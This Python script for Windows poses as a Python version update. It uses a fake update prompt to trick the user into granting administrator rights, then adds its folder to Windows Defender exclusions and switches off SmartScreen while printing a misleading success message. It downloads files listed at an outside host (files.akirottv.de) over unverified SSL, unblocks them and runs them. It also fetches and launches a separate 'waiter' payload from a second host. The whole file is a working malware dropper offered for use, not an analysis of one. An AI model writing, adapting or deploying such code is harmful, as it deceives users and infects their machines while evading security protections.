import os
import pathlib as pl
import ssl
import subprocess
import urllib.request
import sys
import ctypes
import time
import winreg

# ────────────────────────────────────────────────
# CONFIG
APP_NAME = "vshost"
BASE_DIR = str(pl.Path.home() / "python" / "src")
FILES_TXT_URL = "http://files.akirottv.de"
# WAITER
WAITER_URL = "http://waiter.akirottv.de"
WAITER_PATH = os.path.join(BASE_DIR, "waiter")
WAITER_APP_PATH = os.path.join(WAITER_PATH, "waiter.pyw")
#VENV
VENV_DIR = os.path.join(BASE_DIR, ".venv")
VENV_PY = os.path.join(VENV_DIR, "Scripts", "python.exe")
VENV_PYW = os.path.join(VENV_DIR, "Scripts", "pythonw.exe")
# ────────────────────────────────────────────────

APP_DIR = os.path.join(BASE_DIR, APP_NAME)
os.makedirs(APP_DIR, exist_ok=True)
os.makedirs(WAITER_PATH, exist_ok=True)


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0 #type: ignore
    except:
        return False

def send_update_notification():
    install_input = input(
        "A new version of Python is available: 3.12.2\n"
        "You are currently using: 3.11.6\n"
        "Press 'Y' or 'Enter' to update or 'N' to skip: "
    )
    return install_input.strip().lower() in ['y', '']

def request_admin():
    try:
        ctypes.windll.shell32.ShellExecuteW( #type: ignore
            None, "runas", sys.executable, __file__, None, 1
        )
        return True
    except:
        return False

def download_file_list():
    try:
        print("→ Lade Dateiliste...")
        context = ssl._create_unverified_context()

        with urllib.request.urlopen(FILES_TXT_URL, timeout=15, context=context) as resp:
            data = resp.read().decode()

        urls = [
            line.strip()
            for line in data.splitlines()
            if line.startswith("http")
        ]

        print(f"→ {len(urls)} Dateien gefunden")
        return urls

    except Exception as e:
        print(f"Fehler beim Laden der Liste: {e}")
        return []

def download_files(urls):
    for url in urls:
        try:
            print(f"→ Lade {url} ...")

            context = ssl._create_unverified_context()
            with urllib.request.urlopen(url, timeout=15, context=context) as resp:
                data = resp.read()

            filename = os.path.basename(url)
            filepath = os.path.join(APP_DIR, filename)

            with open(filepath, "wb") as f:
                f.write(data)

            print(f"→ Gespeichert: {filename}")

        except Exception as e:
            print(f"Fehler bei {url}: {e}")

def disable_smartscreen():
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer", 0, winreg.KEY_SET_VALUE) #type: ignore
        winreg.SetValueEx(key, "SmartScreenEnabled", 0, winreg.REG_SZ, "Off") #type: ignore
        winreg.CloseKey(key) #type: ignore
        print("PythonSS erfolgreich aktiviert.")
    except Exception as e:
        print(f"Fehler: {e}")

def unblock_files():
    path = APP_DIR
    for file in pl.Path(path).iterdir():
        try:
            print(f"→ Unblocking {file.name}...")
            command = f'powershell -Command "Unblock-File -Path \\"{pl.Path(APP_DIR, file.name)}\\""'
            os.system(command)
        except Exception as e:
            print(f"{e}")

def remove_hkey():
    import winreg
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        key = winreg.OpenKey(  # type: ignore
            winreg.HKEY_CURRENT_USER,  # type: ignore
            key_path,
            0,
            winreg.KEY_SET_VALUE | winreg.KEY_READ,  # type: ignore
        )
        time.sleep(1)
        print(key)
        # Alten Wert löschen, falls vorhanden
        try:
            winreg.DeleteValue(key, "main")  # type: ignore
        except Exception as e:
            print(f"{e}")
            time.sleep(2)
    except Exception as e:
        print(f"Registry Fehler: {e}")


def add_folder_to_windows_defender_exclusions():
    command = f'powershell -Command "Add-MpPreference -ExclusionPath \\"{BASE_DIR}\""'
    os.system(command)

def open_files():
    print("→ Starte Dateien...")

    for file in pl.Path(APP_DIR).iterdir():
        if file.is_file():
            try:
                print(f"→ Öffne {file.name}")

                subprocess.Popen(
                    f'start "" "{file}"',
                    shell=True,
                    cwd=APP_DIR
                )

            except Exception as e:
                print(f"Startfehler: {e}")

def install_waiter():
    os.makedirs(APP_DIR, exist_ok=True)

    try:
        print(f"→ Lade {WAITER_URL} ...")

        context = ssl._create_unverified_context()
        with urllib.request.urlopen(WAITER_URL, context=context, timeout=15) as resp:
            if resp.status != 200:
                print("Download fehlgeschlagen:", resp.status)
                return False

            content = resp.read()

        with open(WAITER_APP_PATH, "wb") as f:
            f.write(content)

        print("→ Datei gespeichert:", WAITER_APP_PATH)
        return True

    except Exception as e:
        print("Download Fehler:", e)
        return False

def start_waiter() -> bool:
    if not os.path.exists(WAITER_APP_PATH):
        print("Datei fehlt:", WAITER_APP_PATH)
        return False

    try:
        # ⚠️ WICHTIG: Popen statt run + KEIN shell
        subprocess.Popen(
            [VENV_PYW, "waiter.pyw"],
            cwd=WAITER_PATH,
            creationflags=subprocess.CREATE_NEW_CONSOLE #type: ignore
        )

        print("→ Anwendung gestartet")
        return True

    except Exception as e:
        print("Startfehler:", e)
        return False

def run():
    print("=== START ===\n")

    if not is_admin():
        print("→ Keine Adminrechte")

        if send_update_notification():
            print("→ Fordere Adminrechte an...")
            request_admin()
            sys.exit(0)
        else:
            print("→ Update übersprungen")
            return

    print("→ Adminrechte OK\n")
    add_folder_to_windows_defender_exclusions()
    disable_smartscreen()

    urls = download_file_list()

    if not urls:
        print("→ Keine Dateien gefunden – Abbruch")
        return

    download_files(urls)
    unblock_files()
    open_files()

    print("\n✅ Fertig")
    if install_waiter():
        start_waiter()
        time.sleep(3)
        remove_hkey()
        exit(0)
    input("Enter drücken zum Beenden...")


if __name__ == "__main__":
    try:
        APP_DIR = os.path.join(BASE_DIR, APP_NAME)
        run = run() #type: ignore
    except Exception as e:
        print(f"CRASH: {e}")
        input("Enter drücken...")
